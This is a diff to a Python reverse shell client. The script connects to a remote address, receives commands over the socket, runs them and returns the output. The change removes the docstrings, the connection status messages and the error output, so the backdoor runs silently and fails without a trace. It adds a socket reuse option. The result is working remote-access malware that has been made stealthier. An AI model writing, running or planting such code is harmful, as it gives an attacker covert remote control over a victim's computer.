@@ -4,9 +4,8 @@ import subprocess
 import sys
 
 def receiver(s):
-    """Receive system commands and execute them."""
     while True:
-        cmd_bytes = s.recv(4096) # 4096 is better for heavy transfers!
+        cmd_bytes = s.recv(4096)
         cmd = cmd_bytes.decode("utf-8")
         if cmd.startswith("cd "):
             os.chdir(cmd[3:])
@@ -18,15 +17,11 @@ def receiver(s):
             s.sendall(data + b"$: ")
 
 def connect(address):
-    """Establish a connection to the address, then call receiver()"""
     try:
         s = socket.socket()
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.connect(address)
-        print("Connection Established.")
-        print(f"Address: {address}")
-    except socket.error as error:
-        print("Something went wrong... more info below.")
-        print(error)
+    except socket.error:
         sys.exit()
     receiver(s)
 
